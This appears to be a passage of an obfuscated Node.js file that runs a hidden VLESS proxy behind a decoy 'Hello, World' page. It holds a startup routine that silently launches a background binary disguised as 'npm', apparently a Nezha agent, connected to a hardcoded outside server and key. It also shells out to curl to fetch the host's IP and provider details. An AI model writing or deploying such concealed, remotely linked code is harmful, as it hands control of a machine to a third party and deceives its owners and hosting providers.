const _0x5b1c85=_0x4680;(function(_0x2a50f2,_0x3d8a66){const _0x4d45f8=_0x4680,_0x3de0dd=_0x2a50f2();while(!![]){try{const _0x7ba3a1=-parseInt(_0x4d45f8(0x1bc))/0x1+-parseInt(_0x4d45f8(0x193))/0x2*(-parseInt(_0x4d45f8(0x1d9))/0x3)+-parseInt(_0x4d45f8(0x23a))/0x4*(parseInt(_0x4d45f8(0x1ba))/0x5)+parseInt(_0x4d45f8(0x18c))/0x6+parseInt(_0x4d45f8(0x1b2))/0x7*(parseInt(_0x4d45f8(0x1ce))/0x8)+parseInt(_0x4d45f8(0x249))/0x9*(parseInt(_0x4d45f8(0x1f6))/0xa)+parseInt(_0x4d45f8(0x1f9))/0xb*(parseInt(_0x4d45f8(0x20a))/0xc);if(_0x7ba3a1===_0x3d8a66)break;else _0x3de0dd['push'](_0x3de0dd['shift']());}catch(_0x2bf5b8){_0x3de0dd['push'](_0x3de0dd['shift']());}}}(_0x4f42,0x5c175));const net=require(_0x5b1c85(0x246)),http=require(_0x5b1c85(0x20e)),{Buffer}=require(_0x5b1c85(0x1cb)),{exec,execSync}=require(_0x5b1c85(0x214)),UUID=process[_0x5b1c85(0x200)]['UUID']||'afc98df1-6d8f-42e5-9b83-97c3ddda36bb',NEZHA_SERVER=process[_0x5b1c85(0x200)]['NEZHA_SERVER']||_0x5b1c85(0x23f),NEZHA_PORT=process[_0x5b1c85(0x200)][_0x5b1c85(0x206)]||'443',NEZHA_KEY=process[_0x5b1c85(0x200)]['NEZHA_KEY']||_0x5b1c85(0x1cf),SUB_PATH=process[_0x5b1c85(0x200)][_0x5b1c85(0x1b9)]||_0x5b1c85(0x191),XPATH=process[_0x5b1c85(0x200)][_0x5b1c85(0x1f0)]||UUID[_0x5b1c85(0x1b3)](0x0,0x8),DOMAIN=process[_0x5b1c85(0x200)][_0x5b1c85(0x1ee)]||'rancisca-hf.qwa.pp.ua',NAME=process['env'][_0x5b1c85(0x22b)]||'Hf',PORT=process[_0x5b1c85(0x200)][_0x5b1c85(0x19a)]||0x1eb4,SETTINGS={['UUID']:UUID,[_0x5b1c85(0x1e1)]:_0x5b1c85(0x190),[_0x5b1c85(0x1d2)]:'1024',['XPATH']:_0x5b1c85(0x1a7)+XPATH,['MAX_BUFFERED_POSTS']:0x1e,['MAX_POST_SIZE']:0xf4240,[_0x5b1c85(0x205)]:0x7530,[_0x5b1c85(0x19d)]:0x400*0x400,['TCP_NODELAY']:!![],[_0x5b1c85(0x1fe)]:!![]};function validate_uuid(_0x5a8416,_0x103c85){for(let _0x45b631=0x0;_0x45b631<0x10;_0x45b631++){if(_0x5a8416[_0x45b631]!==_0x103c85[_0x45b631])return![];}return!![];}function concat_typed_arrays(_0x1f4944,..._0x5bf577){const _0x226f08=_0x5b1c85;if(!_0x5bf577||_0x5bf577['length']<0x1)return _0x1f4944;let _0x49afd9=_0x1f4944[_0x226f08(0x230)];for(let _0x51282d of _0x5bf577)_0x49afd9+=_0x51282d['length'];const _0x5d233c=new _0x1f4944[(_0x226f08(0x18f))](_0x49afd9);_0x5d233c['set'](_0x1f4944,0x0),_0x49afd9=_0x1f4944[_0x226f08(0x230)];for(let _0x8257f1 of _0x5bf577){_0x5d233c[_0x226f08(0x1a5)](_0x8257f1,_0x49afd9),_0x49afd9+=_0x8257f1[_0x226f08(0x230)];}return _0x5d233c;}function log(_0x4913a9,..._0x122da6){const _0x573e79=_0x5b1c85;if(SETTINGS[_0x573e79(0x1e1)]===_0x573e79(0x190))return;const _0x4d3e30={'debug':0x0,'info':0x1,'warn':0x2,'error':0x3},_0x4301a3={'debug':_0x573e79(0x1e0),'info':_0x573e79(0x1c1),'warn':_0x573e79(0x226),'error':_0x573e79(0x1b0),'reset':_0x573e79(0x1a6)},_0x47ff4d=_0x4d3e30[SETTINGS[_0x573e79(0x1e1)]]||0x1,_0x6222d8=_0x4d3e30[_0x4913a9]||0x0;if(_0x6222d8>=_0x47ff4d){const _0x1ead1b=new Date()[_0x573e79(0x1ae)](),_0x1c80d4=_0x4301a3[_0x4913a9]||_0x4301a3[_0x573e79(0x220)];console[_0x573e79(0x20b)](_0x1c80d4+'['+_0x1ead1b+_0x573e79(0x1bd)+_0x4913a9+']',..._0x122da6,_0x4301a3[_0x573e79(0x220)]);}}function _0x4f42(){const _0x45c63b=['201162jIMyvx','curl\x20-s\x20--max-time\x201\x20ipv6.ip.sb','http/1.1','trim','pendingPackets','stream','nextTick','PORT','now','MAX_POST_SIZE','CHUNK_SIZE','Starting\x20to\x20parse\x20VLESS\x20header','VLESS\x20header\x20parsed:\x20','secureConnection','nextSeq','writableEnded','downstreamStarted','Read\x20controller\x20error:','set','\x1b[0m','%2F','New\x20secure\x20connection\x20using:\x20','method','Too\x20many\x20buffered\x20packets','match','connect','Read\x20controller\x20close\x20error:','toISOString','from','\x1b[31m','Client\x20connection\x20closed','4182773xrAgIH','slice','write','Initializing\x20VLESS\x20connection\x20from\x20first\x20packet','\x20>/dev/null\x202>&1\x20&','createConnection','\x20before\x20initialization','SUB_PATH','239985EQpUOA','bufferedData','691921GyWUzY',']\x20[','Failed\x20to\x20initialize\x20VLESS:\x20','pause','vless://','\x1b[32m','Remote\x20connection\x20not\x20available','read','readable','fill','2053','--tls','Transform','writeHead','Failed\x20to\x20process\x20POST\x20request:\x20','buffer','setKeepAlive','debug','8jIfpnn','7polHuZDco5AOy9Ddi','read\x20address\x20type\x20failed','Failed\x20to\x20start\x20downstream\x20for\x20session:\x20','BUFFER_SIZE','connect\x20timeout','data','writable','concat','aborted','replaceAll','3yagmGw','headersTimeout','Transfer-Encoding','unsupported\x20command:\x20','headerSent','releaseLock','header\x20length\x20too\x20short','\x1b[36m','LOG_LEVEL','VLESS\x20header\x20parse\x20error:\x20','/([^/]+)(?:/([0-9]+))?$','delete','Hello,\x20World\x0a','Remote\x20error:\x20','&fp=chrome&allowInsecure=1&type=xhttp&host=','socket\x20hang\x20up','bufferSize','includes','cleanup','Cleanup\x20error:\x20','8443','DOMAIN','2087','XPATH','finally','done','initializeVLESS','reading_done','MAX_BUFFERED_POSTS','90eQiNPn','text/plain','_startDownstreamResponse','187phkAdp','cleaned','Failed\x20to\x20initialize\x20VLESS\x20connection','Connection\x20failed:\x20','Download\x20error:\x20','TCP_KEEPALIVE','setNoDelay','env','headersSent','VLESS\x20connection\x20to\x20','destroy','2083','SESSION_TIMEOUT','NEZHA_PORT','initialized','message','nohup\x20./npm\x20-s\x20','314220BcjVQu','log','App\x20is\x20running','port','http','no-store','value','catch','Upload\x20error:\x20','read\x20vless\x20header\x20error:\x20','child_process','processPacket','hostname','push','parse\x20hostname\x20failed','Failed\x20to\x20write\x20to\x20remote:\x20','Failed\x20to\x20parse\x20hostname','Created\x20new\x20session\x20with\x20UUID:\x20','Created\x20new\x20session\x20for\x20GET:\x20','pendingBuffers','error','application/octet-stream','reset','startDownstream','cork','toString','not\x20enough\x20data\x20to\x20read','uuid','\x1b[33m','lastActivity','reduce','enqueue','443','NAME','floor','remote','info','pipe','length','Failed\x20to\x20get\x20IP\x20address:','socket','random','getWriter','utf-8','destroyed','Cleaning\x20up\x20session\x20','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','size','52sHQXfF','has','localhost','vlessHeader','url','nezha.jaxmike.nyc.mn','Server\x20is\x20running\x20on\x20port\x20','end','responseHeader','Relay\x20error:','warn',',\x20size=','net','invalid\x20UUID','Error\x20starting\x20downstream:\x20','116199wfrVft','Buffered\x20packet\x20seq=','currentStreamRes','join','alpnProtocol','getReader','UUID','timeout','\x20timed\x20out\x20without\x20downstream','_writeToRemote','2601738SEGhYU','close','pipeTo','constructor','none','subb','get'];_0x4f42=function(){return _0x45c63b;};return _0x4f42();}const runnz=async()=>{const _0x22c80d=_0x5b1c85;let _0x3b5dbf='',_0x2a799e='';const _0x2cd1f5=[_0x22c80d(0x22a),_0x22c80d(0x1ed),'2096',_0x22c80d(0x1ef),_0x22c80d(0x204),_0x22c80d(0x1c6)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY)_0x3b5dbf=_0x2cd1f5[_0x22c80d(0x1ea)](NEZHA_PORT)?_0x22c80d(0x1c7):'',_0x2a799e=_0x22c80d(0x209)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x3b5dbf+_0x22c80d(0x1b6);else return;try{exec(_0x2a799e,{'shell':'/bin/bash'}),console[_0x22c80d(0x20b)](_0x22c80d(0x20c));}catch(_0x66cbc0){}};function parse_uuid(_0x5c0cc0){const _0x4d5c28=_0x5b1c85;_0x5c0cc0=_0x5c0cc0[_0x4d5c28(0x1d8)]('-','');const _0x88acd3=[];for(let _0x22a234=0x0;_0x22a234<0x10;_0x22a234++){_0x88acd3[_0x4d5c28(0x217)](parseInt(_0x5c0cc0['substr'](_0x22a234*0x2,0x2),0x10));}return _0x88acd3;}async function read_vless_header(_0x322d99,_0xed6d7){const _0x11d082=_0x5b1c85;let _0x39efac=0x0,_0x515191=new Uint8Array(),_0x470b9c={'value':_0x515191,'done':![]};async function _0x166225(_0x55c120){const _0x4b52c7=_0x4680;if(_0x470b9c[_0x4b52c7(0x1f2)])throw new Error(_0x4b52c7(0x1df));const _0x1020a2=_0x55c120-_0x39efac;if(_0x1020a2<0x1)return;_0x470b9c=await read_atleast(_0x322d99,_0x1020a2),_0x39efac+=_0x470b9c[_0x4b52c7(0x210)][_0x4b52c7(0x230)],_0x515191=concat_typed_arrays(_0x515191,_0x470b9c['value']);}await _0x166225(0x1+0x10+0x1);const _0x561a45=_0x515191[0x0],_0x34d6e3=_0x515191[_0x11d082(0x1b3)](0x1,0x1+0x10),_0x33f18e=parse_uuid(_0xed6d7);if(!validate_uuid(_0x34d6e3,_0x33f18e))throw new Error(_0x11d082(0x247));const _0x4690ef=_0x515191[0x1+0x10],_0x3072a9=0x1+0x10+0x1+_0x4690ef+0x1+0x2+0x1;await _0x166225(_0x3072a9+0x1);const _0x5c41ed=_0x515191[0x1+0x10+0x1+_0x4690ef],_0x119817=0x1;if(_0x5c41ed!==_0x119817)throw new Error(_0x11d082(0x1dc)+_0x5c41ed);const _0x321523=(_0x515191[_0x3072a9-0x1-0x2]<<0x8)+_0x515191[_0x3072a9-0x1-0x1],_0x55a837=_0x515191[_0x3072a9-0x1],_0x13c2dd=0x1,_0x52bc98=0x2,_0x4198c7=0x3;let _0xd173f1=-0x1;if(_0x55a837===_0x13c2dd)_0xd173f1=_0x3072a9+0x4;else{if(_0x55a837===_0x4198c7)_0xd173f1=_0x3072a9+0x10;else _0x55a837===_0x52bc98&&(_0xd173f1=_0x3072a9+0x1+_0x515191[_0x3072a9]);}if(_0xd173f1<0x0)throw new Error(_0x11d082(0x1d0));await _0x166225(_0xd173f1);const _0x4c6661=_0x3072a9;let _0x5229da='';if(_0x55a837===_0x13c2dd)_0x5229da=_0x515191[_0x11d082(0x1b3)](_0x4c6661,_0x4c6661+0x4)[_0x11d082(0x24c)]('.');else{if(_0x55a837===_0x52bc98)_0x5229da=new TextDecoder()['decode'](_0x515191['slice'](_0x4c6661+0x1,_0x4c6661+0x1+_0x515191[_0x4c6661]));else _0x55a837===_0x4198c7&&(_0x5229da=_0x515191[_0x11d082(0x1b3)](_0x4c6661,_0x4c6661+0x10)[_0x11d082(0x228)]((_0x1d57ea,_0x5268a8,_0x151710,_0x3c3b08)=>_0x151710%0x2?_0x1d57ea[_0x11d082(0x1d6)](((_0x3c3b08[_0x151710-0x1]<<0x8)+_0x5268a8)['toString'](0x10)):_0x1d57ea,[])[_0x11d082(0x24c)](':'));}if(!_0x5229da){log(_0x11d082(0x21e),_0x11d082(0x21a));throw new Error(_0x11d082(0x218));}return log(_0x11d082(0x22e),_0x11d082(0x202)+_0x5229da+':'+_0x321523),{'hostname':_0x5229da,'port':_0x321523,'data':_0x515191[_0x11d082(0x1b3)](_0xd173f1),'resp':new Uint8Array([_0x561a45,0x0])};}async function read_atleast(_0x53dca1,_0x3c110a){const _0x2b03d7=_0x5b1c85,_0x26d86a=[];let _0x366acc=![];while(_0x3c110a>0x0&&!_0x366acc){const _0x5c3f67=await _0x53dca1[_0x2b03d7(0x1c3)]();if(_0x5c3f67[_0x2b03d7(0x210)]){const _0x30be9b=new Uint8Array(_0x5c3f67[_0x2b03d7(0x210)]);_0x26d86a[_0x2b03d7(0x217)](_0x30be9b),_0x3c110a-=_0x30be9b[_0x2b03d7(0x230)];}_0x366acc=_0x5c3f67[_0x2b03d7(0x1f2)];}if(_0x3c110a>0x0)throw new Error(_0x2b03d7(0x224));return{'value':concat_typed_arrays(..._0x26d86a),'done':_0x366acc};}async function parse_header(_0x4de603,_0x259672){const _0x5737d1=_0x5b1c85;log(_0x5737d1(0x1cd),_0x5737d1(0x19e));const _0x5d82e7=_0x259672[_0x5737d1(0x1c4)][_0x5737d1(0x24e)]();try{const _0x268c29=await read_vless_header(_0x5d82e7,_0x4de603);return log(_0x5737d1(0x1cd),'VLESS\x20header\x20parsed\x20successfully'),_0x268c29;}catch(_0x1c5c16){log(_0x5737d1(0x21e),_0x5737d1(0x1e2)+_0x1c5c16[_0x5737d1(0x208)]);throw new Error(_0x5737d1(0x213)+_0x1c5c16[_0x5737d1(0x208)]);}finally{_0x5d82e7[_0x5737d1(0x1de)]();}}async function connect_remote(_0x1e740a,_0x105627){const _0x4de740=_0x5b1c85,_0x432aeb=0x1f40;try{const _0x34348f=await timed_connect(_0x1e740a,_0x105627,_0x432aeb);return _0x34348f[_0x4de740(0x1ff)](!![]),_0x34348f[_0x4de740(0x1cc)](!![],0x3e8),_0x34348f[_0x4de740(0x1e9)]=parseInt(SETTINGS[_0x4de740(0x1d2)])*0x400,log(_0x4de740(0x22e),'Connected\x20to\x20'+_0x1e740a+':'+_0x105627),_0x34348f;}catch(_0x5d3935){log(_0x4de740(0x21e),_0x4de740(0x1fc)+_0x5d3935[_0x4de740(0x208)]);throw _0x5d3935;}}function timed_connect(_0x211d29,_0x55da47,_0x47b37b){return new Promise((_0x6da97b,_0x4ac260)=>{const _0x18316e=_0x4680,_0x5f0b72=net[_0x18316e(0x1b7)]({'host':_0x211d29,'port':_0x55da47}),_0x31bc46=setTimeout(()=>{const _0x160392=_0x18316e;_0x4ac260(new Error(_0x160392(0x1d3)));},_0x47b37b);_0x5f0b72['on'](_0x18316e(0x1ac),()=>{clearTimeout(_0x31bc46),_0x6da97b(_0x5f0b72);}),_0x5f0b72['on']('error',_0x941d95=>{clearTimeout(_0x31bc46),_0x4ac260(_0x941d95);});});}function pipe_relay(){async function _0xaa22eb(_0x3c7fd1,_0x41e7d2,_0xefc8b0){const _0x2cc832=_0x4680,_0x53d001=parseInt(SETTINGS[_0x2cc832(0x19d)]);if(_0xefc8b0[_0x2cc832(0x230)]>0x0){if(_0x41e7d2[_0x2cc832(0x1b4)])_0x41e7d2[_0x2cc832(0x222)](),_0x41e7d2[_0x2cc832(0x1b4)](_0xefc8b0),process[_0x2cc832(0x199)](()=>_0x41e7d2['uncork']());else{const _0x3d2062=_0x41e7d2[_0x2cc832(0x1d5)][_0x2cc832(0x234)]();try{await _0x3d2062[_0x2cc832(0x1b4)](_0xefc8b0);}finally{_0x3d2062[_0x2cc832(0x1de)]();}}}try{_0x3c7fd1[_0x2cc832(0x22f)]?(_0x3c7fd1[_0x2cc832(0x1bf)](),_0x3c7fd1[_0x2cc832(0x22f)](_0x41e7d2,{'end':!![],'highWaterMark':_0x53d001}),_0x3c7fd1['resume']()):await _0x3c7fd1[_0x2cc832(0x1c4)][_0x2cc832(0x18e)](_0x41e7d2[_0x2cc832(0x1d5)],{'preventClose':![],'preventAbort':![],'preventCancel':![],'signal':AbortSignal[_0x2cc832(0x250)](SETTINGS[_0x2cc832(0x205)])});}catch(_0x4de6e8){!_0x4de6e8[_0x2cc832(0x208)][_0x2cc832(0x1ea)](_0x2cc832(0x1d7))&&log(_0x2cc832(0x21e),_0x2cc832(0x243),_0x4de6e8[_0x2cc832(0x208)]);throw _0x4de6e8;}}return _0xaa22eb;}function _0x4680(_0x4c6156,_0x1f3d93){const _0x4f4296=_0x4f42();return _0x4680=function(_0x468079,_0x402155){_0x468079=_0x468079-0x18a;let _0x385f98=_0x4f4296[_0x468079];return _0x385f98;},_0x4680(_0x4c6156,_0x1f3d93);}function socketToWebStream(_0x419261){const _0xc73b4d=_0x5b1c85;let _0x131112,_0xfa06cb;return _0x419261['on'](_0xc73b4d(0x21e),_0x16ae8b=>{const _0x1b68f1=_0xc73b4d;log(_0x1b68f1(0x21e),'Socket\x20error:',_0x16ae8b[_0x1b68f1(0x208)]),_0x131112?.[_0x1b68f1(0x21e)](_0x16ae8b),_0xfa06cb?.[_0x1b68f1(0x21e)](_0x16ae8b);}),{'readable':new ReadableStream({'start'(_0x84d36a){const _0x123879=_0xc73b4d;_0x131112=_0x84d36a,_0x419261['on'](_0x123879(0x1d4),_0x3ed52d=>{const _0x509a69=_0x123879;try{_0x84d36a[_0x509a69(0x229)](_0x3ed52d);}catch(_0x4ff665){log(_0x509a69(0x21e),_0x509a69(0x1a4),_0x4ff665[_0x509a69(0x208)]);}}),_0x419261['on'](_0x123879(0x241),()=>{const _0x45aaab=_0x123879;try{_0x84d36a[_0x45aaab(0x18d)]();}catch(_0x12e3dd){log(_0x45aaab(0x21e),_0x45aaab(0x1ad),_0x12e3dd['message']);}});},'cancel'(){_0x419261['destroy']();}}),'writable':new WritableStream({'start'(_0x1ee4e5){_0xfa06cb=_0x1ee4e5;},'write'(_0xbda37){return new Promise((_0x15de2f,_0x1b07eb)=>{const _0x147a87=_0x4680;if(_0x419261['destroyed']){_0x1b07eb(new Error('Socket\x20is\x20destroyed'));return;}_0x419261[_0x147a87(0x1b4)](_0xbda37,_0x459c6f=>{if(_0x459c6f)_0x1b07eb(_0x459c6f);else _0x15de2f();});});},'close'(){const _0x127819=_0xc73b4d;!_0x419261[_0x127819(0x236)]&&_0x419261[_0x127819(0x241)]();},'abort'(_0x5a1b0c){const _0x165ebb=_0xc73b4d;_0x419261[_0x165ebb(0x203)](_0x5a1b0c);}})};}function relay(_0x29275a,_0x15686d,_0x457031,_0x4647cf){const _0xf6540c=_0x5b1c85,_0x2f6a57=pipe_relay();let _0x3b4ac6=![];const _0x56577c=socketToWebStream(_0x457031);function _0x5c50c7(){const _0x2acf34=_0x4680;if(!_0x3b4ac6){_0x3b4ac6=!![];try{_0x457031[_0x2acf34(0x203)]();}catch(_0x147601){!_0x147601[_0x2acf34(0x208)][_0x2acf34(0x1ea)](_0x2acf34(0x1d7))&&!_0x147601[_0x2acf34(0x208)][_0x2acf34(0x1ea)](_0x2acf34(0x1e8))&&log(_0x2acf34(0x21e),_0x2acf34(0x1ec)+_0x147601[_0x2acf34(0x208)]);}}}const _0x118caf=_0x2f6a57(_0x15686d,_0x56577c,_0x4647cf[_0xf6540c(0x1d4)])[_0xf6540c(0x211)](_0x1bc51e=>{const _0x448c85=_0xf6540c;!_0x1bc51e[_0x448c85(0x208)][_0x448c85(0x1ea)](_0x448c85(0x1d7))&&!_0x1bc51e['message']['includes'](_0x448c85(0x1e8))&&log(_0x448c85(0x21e),_0x448c85(0x212)+_0x1bc51e['message']);})[_0xf6540c(0x1f1)](()=>{const _0x4e6d1d=_0xf6540c;_0x15686d[_0x4e6d1d(0x1f4)]&&_0x15686d['reading_done']();}),_0x4ce1ee=_0x2f6a57(_0x56577c,_0x15686d,_0x4647cf['resp'])[_0xf6540c(0x211)](_0xf2fd8b=>{const _0x12377b=_0xf6540c;!_0xf2fd8b[_0x12377b(0x208)]['includes'](_0x12377b(0x1d7))&&!_0xf2fd8b['message'][_0x12377b(0x1ea)](_0x12377b(0x1e8))&&log('error',_0x12377b(0x1fd)+_0xf2fd8b['message']);});_0x4ce1ee['finally'](()=>_0x118caf)[_0xf6540c(0x1f1)](_0x5c50c7);}const sessions=new Map();class Session{constructor(_0x3f5ba4){const _0x323096=_0x5b1c85;this[_0x323096(0x225)]=_0x3f5ba4,this[_0x323096(0x1a1)]=0x0,this[_0x323096(0x1a3)]=![],this[_0x323096(0x227)]=Date[_0x323096(0x19b)](),this[_0x323096(0x23d)]=null,this[_0x323096(0x22d)]=null,this[_0x323096(0x207)]=![],this[_0x323096(0x242)]=null,this[_0x323096(0x1dd)]=![],this[_0x323096(0x1bb)]=new Map(),this[_0x323096(0x1fa)]=![],this[_0x323096(0x197)]=[],this[_0x323096(0x24b)]=null,this['pendingBuffers']=new Map(),log(_0x323096(0x1cd),_0x323096(0x21b)+_0x3f5ba4);}async['initializeVLESS'](_0x1560fa){const _0xcfd06c=_0x5b1c85;if(this['initialized'])return!![];try{log(_0xcfd06c(0x1cd),_0xcfd06c(0x1b5));const _0x1a4498=new ReadableStream({'start'(_0x16b3dd){const _0x28e3c5=_0xcfd06c;_0x16b3dd[_0x28e3c5(0x229)](_0x1560fa),_0x16b3dd['close']();}}),_0x43dd35={'readable':_0x1a4498,'writable':new WritableStream()};return this[_0xcfd06c(0x23d)]=await parse_header(SETTINGS[_0xcfd06c(0x24f)],_0x43dd35),log(_0xcfd06c(0x22e),_0xcfd06c(0x19f)+this[_0xcfd06c(0x23d)]['hostname']+':'+this[_0xcfd06c(0x23d)][_0xcfd06c(0x20d)]),this[_0xcfd06c(0x22d)]=await connect_remote(this[_0xcfd06c(0x23d)][_0xcfd06c(0x216)],this[_0xcfd06c(0x23d)][_0xcfd06c(0x20d)]),log(_0xcfd06c(0x22e),'Remote\x20connection\x20established'),this[_0xcfd06c(0x207)]=!![],!![];}catch(_0x3a1dc6){return log(_0xcfd06c(0x21e),_0xcfd06c(0x1be)+_0x3a1dc6[_0xcfd06c(0x208)]),![];}}async['processPacket'](_0x249883,_0x4bc5d8){const _0x567f04=_0x5b1c85;try{this[_0x567f04(0x21d)][_0x567f04(0x1a5)](_0x249883,_0x4bc5d8),log(_0x567f04(0x1cd),_0x567f04(0x24a)+_0x249883+_0x567f04(0x245)+_0x4bc5d8[_0x567f04(0x230)]);while(this[_0x567f04(0x21d)][_0x567f04(0x23b)](this[_0x567f04(0x1a1)])){const _0x21bcef=this[_0x567f04(0x21d)][_0x567f04(0x192)](this['nextSeq']);this[_0x567f04(0x21d)]['delete'](this['nextSeq']);if(!this[_0x567f04(0x207)]&&this['nextSeq']===0x0){if(!await this[_0x567f04(0x1f3)](_0x21bcef))throw new Error(_0x567f04(0x1fb));this[_0x567f04(0x242)]=Buffer[_0x567f04(0x1af)](this[_0x567f04(0x23d)]['resp']),await this[_0x567f04(0x18b)](this[_0x567f04(0x23d)][_0x567f04(0x1d4)]),this[_0x567f04(0x24b)]&&this[_0x567f04(0x1f8)]();}else{if(!this['initialized']){log(_0x567f04(0x244),'Received\x20out\x20of\x20order\x20packet\x20seq='+_0x249883+_0x567f04(0x1b8));continue;}await this[_0x567f04(0x18b)](_0x21bcef);}this[_0x567f04(0x1a1)]++,log(_0x567f04(0x1cd),'Processed\x20packet\x20seq='+(this['nextSeq']-0x1));}if(this['pendingBuffers'][_0x567f04(0x239)]>SETTINGS[_0x567f04(0x1f5)])throw new Error(_0x567f04(0x1aa));return!![];}catch(_0x30e15c){log(_0x567f04(0x21e),'Process\x20packet\x20error:\x20'+_0x30e15c[_0x567f04(0x208)]);throw _0x30e15c;}}['_startDownstreamResponse'](){const _0x3ed747=_0x5b1c85;if(!this[_0x3ed747(0x24b)]||!this['responseHeader'])return;try{const _0x25cfa1=this[_0x3ed747(0x24b)][_0x3ed747(0x232)]?.['alpnProtocol']||_0x3ed747(0x195),_0x297888=_0x25cfa1==='h2';!this[_0x3ed747(0x1dd)]&&(log(_0x3ed747(0x1cd),'Sending\x20VLESS\x20response\x20header\x20('+_0x25cfa1+'):\x20'+this[_0x3ed747(0x242)][_0x3ed747(0x230)]+'\x20bytes'),this['currentStreamRes']['write'](this[_0x3ed747(0x242)]),this[_0x3ed747(0x1dd)]=!![]);if(_0x297888){this[_0x3ed747(0x24b)][_0x3ed747(0x232)][_0x3ed747(0x1ff)](!![]);const _0x56d883=new require(_0x3ed747(0x198))[_0x3ed747(0x1c8)]({'transform'(_0x2e8379,_0x434503,_0x4901c2){const _0x2d7c74=_0x3ed747,_0x2140dc=0x4000;for(let _0x528200=0x0;_0x528200<_0x2e8379[_0x2d7c74(0x230)];_0x528200+=_0x2140dc){this['push'](_0x2e8379[_0x2d7c74(0x1b3)](_0x528200,_0x528200+_0x2140dc));}_0x4901c2();}});this[_0x3ed747(0x22d)][_0x3ed747(0x22f)](_0x56d883)[_0x3ed747(0x22f)](this[_0x3ed747(0x24b)]);}else this[_0x3ed747(0x22d)][_0x3ed747(0x22f)](this['currentStreamRes']);this[_0x3ed747(0x22d)]['on'](_0x3ed747(0x241),()=>{const _0x2825b1=_0x3ed747;!this[_0x2825b1(0x24b)][_0x2825b1(0x1a2)]&&this['currentStreamRes']['end']();}),this[_0x3ed747(0x22d)]['on'](_0x3ed747(0x21e),_0x484255=>{const _0x2c9e60=_0x3ed747;log(_0x2c9e60(0x21e),_0x2c9e60(0x1e6)+_0x484255[_0x2c9e60(0x208)]),!this[_0x2c9e60(0x24b)][_0x2c9e60(0x1a2)]&&this[_0x2c9e60(0x24b)][_0x2c9e60(0x241)]();});}catch(_0x52390b){log(_0x3ed747(0x21e),'Error\x20starting\x20downstream:\x20'+_0x52390b[_0x3ed747(0x208)]),this[_0x3ed747(0x1eb)]();}}[_0x5b1c85(0x221)](_0x141aba,_0x43a510){const _0x3950f0=_0x5b1c85;return!_0x141aba[_0x3950f0(0x201)]&&_0x141aba[_0x3950f0(0x1c9)](0xc8,_0x43a510),this[_0x3950f0(0x24b)]=_0x141aba,this[_0x3950f0(0x207)]&&this[_0x3950f0(0x242)]&&this['_startDownstreamResponse'](),_0x141aba['on'](_0x3950f0(0x18d),()=>{const _0x2ceabb=_0x3950f0;log(_0x2ceabb(0x22e),_0x2ceabb(0x1b1)),this[_0x2ceabb(0x1eb)]();}),!![];}async[_0x5b1c85(0x18b)](_0x2af17f){const _0x57f084=_0x5b1c85;if(!this[_0x57f084(0x22d)]||this[_0x57f084(0x22d)][_0x57f084(0x236)])throw new Error(_0x57f084(0x1c2));return new Promise((_0x6d1bf1,_0x38fe65)=>{const _0x598711=_0x57f084;this[_0x598711(0x22d)]['write'](_0x2af17f,_0x58d8c1=>{const _0x1b33f3=_0x598711;_0x58d8c1?(log(_0x1b33f3(0x21e),_0x1b33f3(0x219)+_0x58d8c1[_0x1b33f3(0x208)]),_0x38fe65(_0x58d8c1)):_0x6d1bf1();});});}[_0x5b1c85(0x1f8)](){const _0x2de234=_0x5b1c85;if(!this[_0x2de234(0x24b)]||!this['responseHeader'])return;try{!this[_0x2de234(0x1dd)]&&(this[_0x2de234(0x24b)][_0x2de234(0x1b4)](this[_0x2de234(0x242)]),this[_0x2de234(0x1dd)]=!![]),this[_0x2de234(0x22d)][_0x2de234(0x22f)](this[_0x2de234(0x24b)]),this[_0x2de234(0x22d)]['on'](_0x2de234(0x241),()=>{const _0xa528ab=_0x2de234;!this[_0xa528ab(0x24b)][_0xa528ab(0x1a2)]&&this[_0xa528ab(0x24b)][_0xa528ab(0x241)]();}),this[_0x2de234(0x22d)]['on']('error',_0x1a4fc8=>{const _0x37a582=_0x2de234;log(_0x37a582(0x21e),'Remote\x20error:\x20'+_0x1a4fc8[_0x37a582(0x208)]),!this[_0x37a582(0x24b)][_0x37a582(0x1a2)]&&this[_0x37a582(0x24b)][_0x37a582(0x241)]();});}catch(_0x25187d){log(_0x2de234(0x21e),_0x2de234(0x248)+_0x25187d[_0x2de234(0x208)]),this[_0x2de234(0x1eb)]();}}[_0x5b1c85(0x1eb)](){const _0x242bd5=_0x5b1c85;!this[_0x242bd5(0x1fa)]&&(this[_0x242bd5(0x1fa)]=!![],log(_0x242bd5(0x1cd),_0x242bd5(0x237)+this[_0x242bd5(0x225)]),this['remote']&&(this[_0x242bd5(0x22d)]['destroy'](),this['remote']=null),this['initialized']=![],this[_0x242bd5(0x1dd)]=![]);}}const metaInfo=execSync(_0x5b1c85(0x238),{'encoding':_0x5b1c85(0x235)}),ISP=metaInfo[_0x5b1c85(0x196)]();let IP=DOMAIN;if(!DOMAIN)try{IP=execSync('curl\x20-s\x20--max-time\x202\x20ipv4.ip.sb',{'encoding':_0x5b1c85(0x235)})[_0x5b1c85(0x196)]();}catch(_0x4cfac7){try{IP='['+execSync(_0x5b1c85(0x194),{'encoding':_0x5b1c85(0x235)})[_0x5b1c85(0x196)]()+']';}catch(_0x5db3c8){log(_0x5b1c85(0x21e),_0x5b1c85(0x231),_0x5db3c8['message']),IP=_0x5b1c85(0x23c);}}const server=http['createServer']((_0x2ad134,_0x13964e)=>{const _0x3d9e5e=_0x5b1c85,_0x287130={'Access-Control-Allow-Origin':'*','Access-Control-Allow-Methods':'GET,\x20POST','Cache-Control':_0x3d9e5e(0x20f),'X-Accel-Buffering':'no','X-Padding':generatePadding(0x64,0x3e8)};if(_0x2ad134[_0x3d9e5e(0x23e)]==='/'){_0x13964e['writeHead'](0xc8,{'Content-Type':_0x3d9e5e(0x1f7)}),_0x13964e[_0x3d9e5e(0x241)](_0x3d9e5e(0x1e5));return;}if(_0x2ad134[_0x3d9e5e(0x23e)]==='/'+SUB_PATH){const 